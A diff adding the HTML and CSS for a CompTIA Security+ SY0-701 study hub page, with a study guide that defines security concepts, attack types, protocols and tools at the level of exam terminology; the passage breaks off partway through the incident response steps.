@@ -1,0 +1,1712 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CompTIA Security+ Study Hub</title>
+<style>
+:root {
+  --bg: #0f1117; --surface: #1a1d2e; --surface2: #252840; --surface3: #2e3255;
+  --accent: #2ecc71; --accent2: #3498db; --text: #e8eaf0; --text-muted: #8892b0;
+  --border: #2d3153; --radius: 10px; --red: #e74c3c; --yellow: #f1c40f; --purple: #9b59b6;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', system-ui, sans-serif; }
+.top-nav { background: var(--surface); border-bottom: 1px solid var(--border); padding: 12px 30px; display: flex; align-items: center; gap: 16px; }
+.back-link { color: var(--text-muted); text-decoration: none; font-size: 0.85rem; }
+.back-link:hover { color: var(--text); }
+.nav-title { font-weight: 700; }
+.nav-badge { background: linear-gradient(135deg, var(--accent), var(--accent2)); color: white; font-size: 0.7rem; font-weight: 700; padding: 3px 10px; border-radius: 20px; margin-left: auto; }
+.exam-header { background: linear-gradient(135deg, #0d1a14 0%, #1a1d2e 60%, #0f1117 100%); border-bottom: 1px solid var(--border); padding: 36px 40px; position: relative; overflow: hidden; }
+.exam-header::after { content: '🔒'; position: absolute; right: 40px; top: 50%; transform: translateY(-50%); font-size: 5rem; opacity: 0.08; }
+.exam-header .code { font-size: 0.75rem; font-weight: 700; letter-spacing: 2px; color: var(--accent2); text-transform: uppercase; margin-bottom: 8px; }
+.exam-header h1 { font-size: 2rem; font-weight: 800; }
+.exam-header h1 span { background: linear-gradient(90deg, var(--accent), var(--accent2)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+.exam-header p { color: var(--text-muted); margin-top: 8px; font-size: 0.95rem; }
+.exam-meta { display: flex; gap: 24px; margin-top: 16px; flex-wrap: wrap; }
+.meta-item { font-size: 0.8rem; color: var(--text-muted); }
+.meta-item strong { color: var(--text); }
+.tab-bar { background: var(--surface); border-bottom: 1px solid var(--border); display: flex; padding: 0 30px; overflow-x: auto; }
+.tab-btn { background: none; border: none; color: var(--text-muted); cursor: pointer; padding: 16px 20px; font-size: 0.88rem; font-weight: 600; white-space: nowrap; border-bottom: 3px solid transparent; transition: color 0.2s, border-color 0.2s; }
+.tab-btn:hover { color: var(--text); }
+.tab-btn.active { color: var(--accent); border-bottom-color: var(--accent); }
+.content-area { max-width: 960px; margin: 0 auto; padding: 36px 30px; }
+.tab-panel { display: none; }
+.tab-panel.active { display: block; }
+.domain-card { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); margin-bottom: 20px; overflow: hidden; }
+.domain-header { display: flex; align-items: center; justify-content: space-between; padding: 18px 22px; cursor: pointer; user-select: none; }
+.domain-header:hover { background: var(--surface2); }
+.domain-header h3 { font-size: 1rem; font-weight: 700; display: flex; align-items: center; gap: 10px; }
+.domain-pct { font-size: 0.75rem; color: var(--text-muted); background: var(--surface2); padding: 3px 10px; border-radius: 20px; }
+.chevron { transition: transform 0.2s; color: var(--text-muted); }
+.domain-header.open .chevron { transform: rotate(180deg); }
+.domain-body { display: none; padding: 0 22px 22px; }
+.domain-body.open { display: block; }
+.domain-body h4 { font-size: 0.85rem; font-weight: 700; color: var(--accent); text-transform: uppercase; letter-spacing: 1px; margin: 16px 0 8px; }
+.domain-body p, .domain-body li { font-size: 0.9rem; color: var(--text-muted); line-height: 1.7; }
+.domain-body ul, .domain-body ol { padding-left: 20px; }
+.domain-body li { margin-bottom: 4px; }
+.key-term { display: inline-block; background: var(--surface2); border: 1px solid var(--border); border-radius: 4px; padding: 2px 8px; font-size: 0.8rem; color: var(--accent); margin: 2px; font-family: monospace; }
+.info-box { background: rgba(46,204,113,0.1); border: 1px solid rgba(46,204,113,0.3); border-radius: 8px; padding: 14px 16px; margin: 14px 0; font-size: 0.88rem; line-height: 1.6; }
+.warn-box { background: rgba(231,76,60,0.1); border: 1px solid rgba(231,76,60,0.3); border-radius: 8px; padding: 14px 16px; margin: 14px 0; font-size: 0.88rem; line-height: 1.6; }
+.table-wrap { overflow-x: auto; margin: 14px 0; }
+table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
+th { background: var(--surface2); padding: 10px 14px; text-align: left; font-size: 0.78rem; text-transform: uppercase; letter-spacing: 1px; color: var(--text-muted); }
+td { padding: 9px 14px; border-bottom: 1px solid var(--border); color: var(--text-muted); }
+tr:last-child td { border-bottom: none; }
+td strong { color: var(--text); }
+/* Flashcards */
+.fc-controls { display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; flex-wrap: wrap; gap: 12px; }
+.fc-controls .category-select { background: var(--surface); border: 1px solid var(--border); color: var(--text); padding: 8px 14px; border-radius: 8px; font-size: 0.88rem; }
+.flashcard-scene { width: 100%; max-width: 600px; height: 280px; margin: 0 auto 28px; perspective: 1000px; cursor: pointer; }
+.flashcard { width: 100%; height: 100%; position: relative; transform-style: preserve-3d; transition: transform 0.5s; }
+.flashcard.flipped { transform: rotateY(180deg); }
+.fc-face { position: absolute; width: 100%; height: 100%; backface-visibility: hidden; border-radius: var(--radius); display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 30px; text-align: center; }
+.fc-front { background: linear-gradient(135deg, var(--surface2), var(--surface)); border: 1px solid var(--border); }
+.fc-back { background: linear-gradient(135deg, #0d1f18, var(--surface)); border: 1px solid rgba(46,204,113,0.4); transform: rotateY(180deg); }
+.fc-label { font-size: 0.7rem; font-weight: 700; letter-spacing: 2px; text-transform: uppercase; color: var(--text-muted); margin-bottom: 14px; }
+.fc-term { font-size: 1.4rem; font-weight: 700; line-height: 1.3; }
+.fc-definition { font-size: 0.95rem; color: var(--text-muted); line-height: 1.6; }
+.fc-hint { font-size: 0.78rem; color: var(--text-muted); margin-top: 12px; }
+.fc-nav { display: flex; justify-content: center; gap: 16px; align-items: center; }
+.fc-btn { background: var(--surface); border: 1px solid var(--border); color: var(--text); padding: 10px 24px; border-radius: 8px; cursor: pointer; font-size: 0.88rem; font-weight: 600; }
+.fc-btn:hover { background: var(--surface2); }
+.fc-count { font-size: 0.9rem; color: var(--text-muted); min-width: 80px; text-align: center; }
+.fc-known-btn { background: var(--accent); color: white; border: none; padding: 8px 18px; border-radius: 8px; cursor: pointer; font-size: 0.82rem; font-weight: 600; }
+.fc-unknown-btn { background: var(--red); color: white; border: none; padding: 8px 18px; border-radius: 8px; cursor: pointer; font-size: 0.82rem; font-weight: 600; }
+.fc-score { text-align: center; margin-top: 14px; font-size: 0.85rem; color: var(--text-muted); }
+.fc-score span { color: var(--accent); font-weight: 700; }
+/* Quiz */
+.quiz-progress-bar { width: 100%; height: 6px; background: var(--surface2); border-radius: 3px; margin: 16px 0; overflow: hidden; }
+.quiz-progress-fill { height: 100%; background: linear-gradient(90deg, var(--accent), var(--accent2)); border-radius: 3px; transition: width 0.3s; }
+.question-card { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); padding: 28px; margin-bottom: 20px; }
+.q-number { font-size: 0.75rem; font-weight: 700; letter-spacing: 1px; color: var(--text-muted); margin-bottom: 10px; text-transform: uppercase; }
+.q-text { font-size: 1rem; line-height: 1.6; margin-bottom: 20px; font-weight: 500; }
+.q-options { display: flex; flex-direction: column; gap: 10px; }
+.q-opt { background: var(--surface2); border: 2px solid var(--border); border-radius: 8px; padding: 13px 16px; cursor: pointer; transition: all 0.15s; display: flex; align-items: flex-start; gap: 12px; font-size: 0.9rem; line-height: 1.5; }
+.q-opt:hover:not(.disabled) { border-color: var(--accent); background: rgba(46,204,113,0.08); }
+.q-opt.correct { border-color: var(--accent); background: rgba(46,204,113,0.12); }
+.q-opt.incorrect { border-color: var(--red); background: rgba(231,76,60,0.1); }
+.q-opt.disabled { cursor: default; }
+.q-letter { font-weight: 700; color: var(--text-muted); min-width: 18px; }
+.q-explanation { margin-top: 16px; background: rgba(52,152,219,0.1); border: 1px solid rgba(52,152,219,0.3); border-radius: 8px; padding: 14px; font-size: 0.87rem; line-height: 1.6; display: none; }
+.q-explanation.show { display: block; }
+.quiz-next-btn { background: linear-gradient(135deg, var(--accent), var(--accent2)); color: white; border: none; padding: 13px 32px; border-radius: 8px; cursor: pointer; font-size: 0.95rem; font-weight: 700; margin-top: 10px; display: none; }
+.quiz-next-btn.show { display: inline-block; }
+.quiz-result { text-align: center; padding: 50px 30px; }
+.quiz-result .score { font-size: 4rem; font-weight: 800; }
+.quiz-result .score-label { color: var(--text-muted); margin-bottom: 20px; }
+.quiz-result .verdict { font-size: 1.1rem; font-weight: 600; margin-bottom: 24px; }
+.restart-btn { background: linear-gradient(135deg, var(--accent), var(--accent2)); color: white; border: none; padding: 13px 30px; border-radius: 8px; cursor: pointer; font-size: 0.95rem; font-weight: 700; }
+/* Cheat Sheet */
+.cheat-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 18px; }
+.cheat-card { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); padding: 20px; }
+.cheat-card h3 { font-size: 0.85rem; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; color: var(--accent); margin-bottom: 14px; padding-bottom: 10px; border-bottom: 1px solid var(--border); }
+.cheat-row { display: flex; justify-content: space-between; align-items: flex-start; padding: 6px 0; border-bottom: 1px solid rgba(45,49,83,0.5); font-size: 0.83rem; gap: 10px; }
+.cheat-row:last-child { border-bottom: none; }
+.cheat-key { color: var(--text); font-weight: 600; min-width: 100px; }
+.cheat-val { color: var(--text-muted); text-align: right; font-size: 0.8rem; }
+/* Activities */
+.activity-card { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); padding: 24px; margin-bottom: 20px; }
+.activity-card .act-type { font-size: 0.7rem; font-weight: 700; letter-spacing: 2px; text-transform: uppercase; color: var(--accent); margin-bottom: 8px; }
+.activity-card h3 { font-size: 1rem; font-weight: 700; margin-bottom: 10px; }
+.activity-card p { color: var(--text-muted); font-size: 0.88rem; line-height: 1.7; margin-bottom: 12px; }
+.activity-card ol { padding-left: 20px; }
+.activity-card ol li { font-size: 0.88rem; color: var(--text-muted); line-height: 1.7; margin-bottom: 6px; }
+.reading-prompt { background: var(--surface2); border-left: 3px solid var(--accent); padding: 14px 16px; border-radius: 0 8px 8px 0; margin: 12px 0; font-size: 0.88rem; color: var(--text-muted); line-height: 1.6; }
+.resource-link { display: block; color: var(--accent2); font-size: 0.82rem; padding: 2px 0; }
+
+  /* Concepts & Visuals Tab */
+  .concepts-section { margin-bottom: 36px; }
+  .concepts-section h2 { font-size: 1.15rem; font-weight: 700; color: var(--accent); margin-bottom: 6px; border-bottom: 1px solid var(--border); padding-bottom: 8px; }
+  .concepts-section h3 { font-size: 0.95rem; font-weight: 700; color: var(--text); margin: 18px 0 8px; }
+  .concepts-section p { font-size: 0.88rem; color: var(--text-muted); line-height: 1.7; margin-bottom: 10px; }
+  .concepts-section .example-box { background: var(--surface2); border-left: 3px solid var(--accent); border-radius: 6px; padding: 12px 16px; margin: 10px 0; font-size: 0.85rem; color: var(--text); }
+  .concepts-section .example-box strong { color: var(--accent); }
+  .vocab-search { width: 100%; padding: 10px 14px; background: var(--surface2); border: 1px solid var(--border); border-radius: 8px; color: var(--text); font-size: 0.9rem; margin-bottom: 18px; outline: none; }
+  .vocab-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 12px; }
+  .vocab-card { background: var(--surface2); border: 1px solid var(--border); border-radius: 8px; padding: 14px; }
+  .vocab-card .vocab-term { font-weight: 700; font-size: 0.88rem; color: var(--accent); margin-bottom: 5px; }
+  .vocab-card .vocab-def { font-size: 0.82rem; color: var(--text-muted); line-height: 1.5; }
+  .vocab-card .vocab-example { font-size: 0.78rem; color: var(--text); margin-top: 6px; padding-top: 6px; border-top: 1px solid var(--border); font-style: italic; }
+  .infographic-wrap { background: var(--surface); border: 1px solid var(--border); border-radius: 10px; padding: 20px; margin: 14px 0; overflow-x: auto; }
+  .infographic-wrap svg { display: block; max-width: 100%; height: auto; }
+  .concept-table { width: 100%; border-collapse: collapse; font-size: 0.82rem; margin: 10px 0; }
+  .concept-table th { background: var(--surface2); color: var(--accent); text-align: left; padding: 8px 10px; border: 1px solid var(--border); font-size: 0.8rem; text-transform: uppercase; letter-spacing: 0.5px; }
+  .concept-table td { padding: 7px 10px; border: 1px solid var(--border); color: var(--text-muted); vertical-align: top; }
+  .concept-table tr:nth-child(even) td { background: var(--surface2); }
+  .tip-box { background: var(--surface2); border: 1px solid #2a6b4a; border-radius: 8px; padding: 12px 16px; margin: 10px 0; font-size: 0.84rem; }
+  .tip-box .tip-label { color: #2ecc71; font-weight: 700; font-size: 0.78rem; letter-spacing: 1px; text-transform: uppercase; margin-bottom: 4px; }
+  .warn-box { background: var(--surface2); border: 1px solid #7a3a1a; border-radius: 8px; padding: 12px 16px; margin: 10px 0; font-size: 0.84rem; }
+  .warn-box .warn-label { color: #e67e22; font-weight: 700; font-size: 0.78rem; letter-spacing: 1px; text-transform: uppercase; margin-bottom: 4px; }
+
+  /* ── Week Assignment Tracker ── */
+  .week-tracker {
+    background: var(--surface); border-bottom: 2px solid var(--accent);
+    padding: 0; overflow: hidden;
+  }
+  .tracker-toggle {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 12px 30px; cursor: pointer; user-select: none;
+    transition: background 0.15s;
+  }
+  .tracker-toggle:hover { background: var(--surface2); }
+  .tracker-title { font-size: 0.88rem; font-weight: 700; color: var(--accent); display: flex; align-items: center; gap: 8px; }
+  .tracker-progress { font-size: 0.78rem; color: var(--text-muted); background: var(--surface2); padding: 3px 10px; border-radius: 20px; }
+  .tracker-chevron { color: var(--text-muted); font-size: 0.75rem; transition: transform 0.2s; }
+  .tracker-chevron.open { transform: rotate(180deg); }
+  .tracker-body {
+    display: none; padding: 16px 30px 20px;
+    border-top: 1px solid var(--border);
+    display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 10px;
+  }
+  .tracker-body.open { display: grid; }
+  .tracker-day {
+    background: var(--surface2); border: 1px solid var(--border); border-radius: 8px;
+    padding: 12px 14px; display: flex; align-items: flex-start; gap: 10px;
+  }
+  .tracker-day input[type=checkbox] { margin-top: 3px; flex-shrink: 0; width: 16px; height: 16px; cursor: pointer; accent-color: var(--accent); }
+  .tracker-day label { font-size: 0.83rem; line-height: 1.5; cursor: pointer; color: var(--text-muted); }
+  .tracker-day label strong { color: var(--text); display: block; margin-bottom: 2px; }
+  .tracker-day.done { border-color: var(--green); background: rgba(46,204,113,0.07); }
+  .tracker-day.done label { color: var(--text); }
+
+  /* ── Score Card ── */
+  .score-card {
+    border-radius: 16px; padding: 32px; max-width: 500px;
+    margin: 0 auto; background: var(--surface);
+    border: 3px solid var(--border);
+  }
+  .score-card.pass { border-color: var(--green); }
+  .score-card.fail { border-color: #e74c3c; }
+  .score-card-header { text-align: center; margin-bottom: 20px; }
+  .score-card-title { font-size: 1.1rem; font-weight: 700; margin-bottom: 4px; }
+  .score-card-date { font-size: 0.82rem; color: var(--text-muted); }
+  .score-card-numbers { display: flex; justify-content: center; gap: 40px; margin: 20px 0; }
+  .score-card-num { text-align: center; }
+  .score-card-big { font-size: 2.8rem; font-weight: 800; line-height: 1; }
+  .score-card-lbl { font-size: 0.72rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px; margin-top: 4px; }
+  .score-card-banner { text-align: center; padding: 11px; border-radius: 8px; margin-bottom: 18px; font-weight: 700; }
+  .score-card-banner.pass { background: rgba(46,204,113,0.12); border: 1px solid var(--green); color: var(--green); }
+  .score-card-banner.fail { background: rgba(231,76,60,0.1); border: 1px solid #e74c3c; color: #e74c3c; }
+  .screenshot-prompt {
+    background: rgba(241,196,15,0.1); border: 1px solid rgba(241,196,15,0.5);
+    border-radius: 8px; padding: 12px 16px; text-align: center; margin-bottom: 18px;
+  }
+  .screenshot-prompt .sp-label { font-size: 0.8rem; font-weight: 700; color: #f1c40f; margin-bottom: 4px; }
+  .screenshot-prompt .sp-sub { font-size: 0.78rem; color: var(--text-muted); }
+  .score-card-btns { display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; }
+  .score-card-btns button { padding: 10px 22px; border-radius: 8px; cursor: pointer; font-size: 0.88rem; font-weight: 700; border: none; }
+
+
+  /* ── Tips & Careers tab ─────────────────────────────────── */
+  .mnem-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 18px 20px;
+    margin-bottom: 14px;
+  }
+  .mnem-title {
+    font-weight: 700;
+    font-size: 1rem;
+    margin-bottom: 8px;
+    color: var(--text);
+  }
+  .mnem-phrase {
+    font-size: 1.05rem;
+    margin-bottom: 10px;
+    padding: 10px 14px;
+    background: var(--bg);
+    border-left: 4px solid var(--accent);
+    border-radius: 0 6px 6px 0;
+    font-style: italic;
+  }
+  .mnem-breakdown {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 8px;
+    margin-top: 10px;
+  }
+  .mnem-step {
+    background: var(--accent);
+    color: #fff;
+    padding: 4px 10px;
+    border-radius: 20px;
+    font-size: .82rem;
+    white-space: nowrap;
+  }
+  .mnem-detail {
+    font-size: .88rem;
+    color: var(--text-muted);
+    margin-top: 8px;
+    line-height: 1.7;
+  }
+  .strategy-section { margin-bottom: 28px; }
+  .strategy-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+    gap: 14px;
+    margin-bottom: 14px;
+  }
+  .strategy-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 16px 18px;
+  }
+  .strategy-card h4 {
+    margin: 0 0 8px;
+    font-size: .95rem;
+    color: var(--accent);
+  }
+  .strategy-card p, .strategy-card li {
+    font-size: .88rem;
+    color: var(--text-muted);
+    line-height: 1.7;
+  }
+  .resource-link {
+    display: inline-block;
+    padding: 6px 14px;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 20px;
+    font-size: .83rem;
+    color: var(--accent);
+    text-decoration: none;
+    transition: background .2s;
+  }
+  .resource-link:hover { background: var(--accent); color: #fff; }
+  .careers-section { margin-bottom: 28px; }
+  .careers-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+    gap: 14px;
+  }
+  .career-card-tip {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 16px;
+  }
+  .career-card-title {
+    font-weight: 700;
+    font-size: .95rem;
+    margin-bottom: 6px;
+  }
+  .career-salary {
+    font-size: .9rem;
+    color: var(--accent);
+    font-weight: 600;
+    margin-bottom: 8px;
+  }
+  .career-desc {
+    font-size: .83rem;
+    color: var(--text-muted);
+    line-height: 1.6;
+  }
+  /* tip section headings */
+  .tips-section-title {
+    font-size: 1.1rem;
+    font-weight: 700;
+    margin: 28px 0 14px;
+    padding-bottom: 8px;
+    border-bottom: 2px solid var(--accent);
+    color: var(--text);
+  }
+
+</style>
+</head>
+<body>
+
+<div class="top-nav">
+  <a href="index.html" class="back-link">← Library Home</a>
+  <span class="nav-title">CompTIA Security+ Study Hub</span>
+  <span class="nav-badge">SY0-701</span>
+</div>
+
+<div class="exam-header">
+  <div class="code">CompTIA Security+ &nbsp;|&nbsp; Exam: SY0-701</div>
+  <h1><span>CompTIA Security+</span> Study Hub</h1>
+  <p>Threats, architecture, operations, and security program management</p>
+  <div class="exam-meta">
+    <div class="meta-item"><strong>Format:</strong> 90 questions max</div>
+    <div class="meta-item"><strong>Duration:</strong> 90 minutes</div>
+    <div class="meta-item"><strong>Passing Score:</strong> 750/900</div>
+    <div class="meta-item"><strong>Question Types:</strong> MCQ, performance-based, drag-and-drop</div>
+  </div>
+</div>
+
+<div class="tab-bar">
+  <button class="tab-btn active" onclick="showTab('guide', event)">📖 Study Guide</button>
+  <button class="tab-btn" onclick="showTab('flashcards', event)">🃏 Flashcards</button>
+  <button class="tab-btn" onclick="showTab('quiz', event)">❓ Practice Quiz</button>
+  <button class="tab-btn" onclick="showTab('cheatsheet', event)">📋 Cheat Sheet</button>
+  <button class="tab-btn" onclick="showTab('activities', event)">🔬 Activities</button>
+  <button class="tab-btn" onclick="showTab('concepts', event)">💡 Concepts &amp; Visuals</button>
+  <button class="tab-btn" onclick="showTab('tips')">🧠 Tips &amp; Careers</button>
+</div>
+
+<div class="content-area">
+
+<!-- STUDY GUIDE -->
+<div id="panel-guide" class="tab-panel active">
+  <h2 style="margin-bottom:6px;font-size:1.1rem;">Security+ Domain Study Guide</h2>
+  <p style="color:var(--text-muted);font-size:0.88rem;margin-bottom:24px;">Click any domain to expand. Based on SY0-701 objectives.</p>
+
+  <div class="domain-card">
+    <div class="domain-header" onclick="toggleDomain(this)">
+      <h3>🛡️ 1.0 — General Security Concepts <span class="domain-pct">12%</span></h3>
+      <span class="chevron">▼</span>
+    </div>
+    <div class="domain-body">
+      <h4>Core Security Principles</h4>
+      <ul>
+        <li><strong>CIA Triad:</strong> Confidentiality (prevent unauthorized disclosure), Integrity (prevent unauthorized modification), Availability (ensure authorized access when needed)</li>
+        <li><strong>Non-repudiation:</strong> Cannot deny performing an action. Achieved via digital signatures</li>
+        <li><strong>AAA:</strong> Authentication (verify identity), Authorization (define what they can do), Accounting (log what they did)</li>
+        <li><strong>Least Privilege:</strong> Grant only minimum permissions needed to perform a job</li>
+        <li><strong>Defense in Depth:</strong> Multiple overlapping security layers — no single point of failure</li>
+        <li><strong>Zero Trust:</strong> Never trust, always verify. No implicit trust based on network location</li>
+      </ul>
+      <h4>Cryptography Fundamentals</h4>
+      <div class="table-wrap"><table>
+        <tr><th>Type</th><th>Key Structure</th><th>Speed</th><th>Use Case</th></tr>
+        <tr><td><strong>Symmetric</strong></td><td>Same key to encrypt &amp; decrypt</td><td>Fast</td><td>Bulk data encryption (AES)</td></tr>
+        <tr><td><strong>Asymmetric</strong></td><td>Public key encrypts, private key decrypts</td><td>Slow</td><td>Key exchange, digital signatures (RSA)</td></tr>
+        <tr><td><strong>Hashing</strong></td><td>One-way, no key</td><td>Very fast</td><td>Integrity checks, password storage</td></tr>
+      </table></div>
+      <h4>Key Algorithms</h4>
+      <ul>
+        <li><strong>AES:</strong> Advanced Encryption Standard. Symmetric. 128/192/256-bit keys. Current standard for bulk encryption</li>
+        <li><strong>RSA:</strong> Asymmetric. 2048+ bit keys recommended. Used for key exchange and digital signatures</li>
+        <li><strong>SHA-256/512:</strong> Secure Hash Algorithm. Produces 256 or 512-bit hashes. Replaces MD5 and SHA-1</li>
+        <li><strong>ECC:</strong> Elliptic Curve Cryptography. Smaller keys, same security as RSA. Used in mobile/IoT</li>
+        <li><strong>Diffie-Hellman:</strong> Key exchange protocol. Allows two parties to establish shared secret over unsecured channel</li>
+      </ul>
+      <h4>PKI (Public Key Infrastructure)</h4>
+      <ul>
+        <li><strong>Certificate Authority (CA):</strong> Trusted entity that issues digital certificates</li>
+        <li><strong>Digital Certificate:</strong> Contains public key + identity info, signed by CA. Verified via chain of trust</li>
+        <li><strong>CRL:</strong> Certificate Revocation List — list of revoked certs</li>
+        <li><strong>OCSP:</strong> Online Certificate Status Protocol — real-time cert validation (faster than CRL)</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="domain-card">
+    <div class="domain-header" onclick="toggleDomain(this)">
+      <h3>⚠️ 2.0 — Threats, Vulnerabilities &amp; Mitigations <span class="domain-pct">22%</span></h3>
+      <span class="chevron">▼</span>
+    </div>
+    <div class="domain-body">
+      <h4>Threat Actor Types</h4>
+      <div class="table-wrap"><table>
+        <tr><th>Actor</th><th>Motivation</th><th>Capability</th></tr>
+        <tr><td><strong>Script Kiddie</strong></td><td>Fun/fame, no real skill</td><td>Low — uses existing tools</td></tr>
+        <tr><td><strong>Hacktivist</strong></td><td>Political/social agenda</td><td>Moderate</td></tr>
+        <tr><td><strong>Insider Threat</strong></td><td>Financial gain, revenge</td><td>High — internal access</td></tr>
+        <tr><td><strong>Organized Crime</strong></td><td>Financial gain</td><td>High — well-funded</td></tr>
+        <tr><td><strong>Nation-State / APT</strong></td><td>Espionage, disruption</td><td>Very high — unlimited resources</td></tr>
+      </table></div>
+      <h4>Attack Types</h4>
+      <ul>
+        <li><strong>SQL Injection:</strong> Malicious SQL code injected into input fields to manipulate database queries. Mitigation: parameterized queries, input validation</li>
+        <li><strong>XSS (Cross-Site Scripting):</strong> Injects malicious scripts into web pages viewed by others. Reflected (immediate), stored (persistent), DOM-based</li>
+        <li><strong>CSRF:</strong> Cross-Site Request Forgery — tricks user's browser into making unintended requests. Mitigation: CSRF tokens</li>
+        <li><strong>Buffer Overflow:</strong> Writing data beyond a buffer's boundary to overwrite memory. Can lead to arbitrary code execution</li>
+        <li><strong>Man-in-the-Middle (MITM):</strong> Attacker intercepts communication between two parties</li>
+        <li><strong>Replay Attack:</strong> Captured authentication data is retransmitted. Mitigated by timestamps and nonces</li>
+        <li><strong>Pass the Hash:</strong> Captured hashed credentials used directly for authentication without cracking</li>
+        <li><strong>Credential Stuffing:</strong> Automated use of stolen username/password pairs from breaches</li>
+      </ul>
+      <h4>Vulnerability Management</h4>
+      <ul>
+        <li><strong>CVE:</strong> Common Vulnerabilities and Exposures — unique ID for known vulnerabilities</li>
+        <li><strong>CVSS:</strong> Common Vulnerability Scoring System — 0-10 severity score</li>
+        <li><strong>Patch management:</strong> Regular, tested deployment of security patches</li>
+        <li><strong>Vulnerability scanning:</strong> Automated identification of weaknesses (Nessus, Qualys)</li>
+        <li><strong>Penetration testing:</strong> Authorized simulated attack to find real exploitable vulnerabilities</li>
+        <li><strong>Zero-day:</strong> Vulnerability exploited before vendor has issued a patch</li>
+      </ul>
+      <div class="warn-box">🔴 <strong>Exam tip:</strong> Know the difference between vulnerability scanning (passive, finding weaknesses) and penetration testing (active, exploiting weaknesses).</div>
+    </div>
+  </div>
+
+  <div class="domain-card">
+    <div class="domain-header" onclick="toggleDomain(this)">
+      <h3>🏛️ 3.0 — Security Architecture <span class="domain-pct">18%</span></h3>
+      <span class="chevron">▼</span>
+    </div>
+    <div class="domain-body">
+      <h4>Network Security Architecture</h4>
+      <ul>
+        <li><strong>DMZ:</strong> Demilitarized Zone — semi-trusted zone for public-facing servers (web, email, DNS) between two firewalls</li>
+        <li><strong>Segmentation:</strong> Divide network into zones (VLAN, subnets, firewalls) to limit lateral movement</li>
+        <li><strong>Air gap:</strong> Physical isolation — no network connection. Used for highly classified systems</li>
+        <li><strong>Honeypot:</strong> Decoy system designed to attract and study attackers</li>
+        <li><strong>Honeynet:</strong> Network of honeypots</li>
+      </ul>
+      <h4>Cloud Security</h4>
+      <ul>
+        <li><strong>Shared Responsibility Model:</strong> Cloud provider secures infrastructure; customer secures data, identities, and apps</li>
+        <li><strong>CASB:</strong> Cloud Access Security Broker — enforces security policies for cloud services</li>
+        <li><strong>CSPM:</strong> Cloud Security Posture Management — identifies misconfigurations</li>
+        <li><strong>CWPP:</strong> Cloud Workload Protection Platform — secures workloads (VMs, containers)</li>
+        <li><strong>FaaS security:</strong> Function-as-a-Service (serverless) — ephemeral, monitor permissions and secrets management</li>
+      </ul>
+      <h4>Secure Protocols</h4>
+      <div class="table-wrap"><table>
+        <tr><th>Protocol</th><th>Port</th><th>Replaces / Purpose</th></tr>
+        <tr><td><strong>HTTPS</strong></td><td>443</td><td>HTTP + TLS encryption</td></tr>
+        <tr><td><strong>SFTP</strong></td><td>22</td><td>FTP over SSH</td></tr>
+        <tr><td><strong>FTPS</strong></td><td>990</td><td>FTP + SSL/TLS</td></tr>
+        <tr><td><strong>LDAPS</strong></td><td>636</td><td>LDAP + SSL (directory services)</td></tr>
+        <tr><td><strong>DNSSEC</strong></td><td>53</td><td>Signed DNS records, prevents poisoning</td></tr>
+        <tr><td><strong>SNMPv3</strong></td><td>161</td><td>SNMP with encryption + auth</td></tr>
+        <tr><td><strong>TLS 1.3</strong></td><td>N/A</td><td>Current transport encryption standard</td></tr>
+      </table></div>
+    </div>
+  </div>
+
+  <div class="domain-card">
+    <div class="domain-header" onclick="toggleDomain(this)">
+      <h3>⚙️ 4.0 — Security Operations <span class="domain-pct">28%</span></h3>
+      <span class="chevron">▼</span>
+    </div>
+    <div class="domain-body">
+      <h4>Identity &amp; Access Management (IAM)</h4>
+      <ul>
+        <li><strong>MFA factors:</strong> Something you know (password), something you have (token/phone), something you are (biometric). TOTP (Time-based OTP), HOTP (HMAC-based OTP)</li>
+        <li><strong>SSO:</strong> Single Sign-On — authenticate once, access multiple resources. Uses SAML, OAuth 2.0, OpenID Connect</li>
+        <li><strong>PAM:</strong> Privileged Access Management — controls and monitors admin/root access</li>
+        <li><strong>Directory Services:</strong> LDAP (Lightweight Directory Access Protocol) — stores and queries user/group data. Active Directory uses LDAP</li>
+        <li><strong>Federation:</strong> Trust relationship between organizations (e.g., login with Google/Microsoft)</li>
+      </ul>
+      <h4>Security Tools &amp; Technologies</h4>
+      <ul>
+        <li><strong>SIEM:</strong> Security Information and Event Management — aggregates and correlates logs from multiple sources for threat detection</li>
+        <li><strong>SOAR:</strong> Security Orchestration, Automation and Response — automates incident response workflows</li>
+        <li><strong>EDR:</strong> Endpoint Detection and Response — continuous monitoring and response on endpoints</li>
+        <li><strong>XDR:</strong> Extended Detection and Response — extends EDR across network, cloud, email</li>
+        <li><strong>DLP:</strong> Data Loss Prevention — prevents unauthorized data exfiltration</li>
+        <li><strong>IDS/IPS:</strong> Intrusion Detection/Prevention System. NIDS = network-based, HIDS = host-based. IDS alerts, IPS blocks</li>
+      </ul>
+      <h4>Incident Response</h4>
+      <ol>
+        <li><strong>Preparation:</strong> Build IR plan, train team, deploy tools</li>
+        <li><strong>Identification:</strong> Detect and analyze the incident</li>
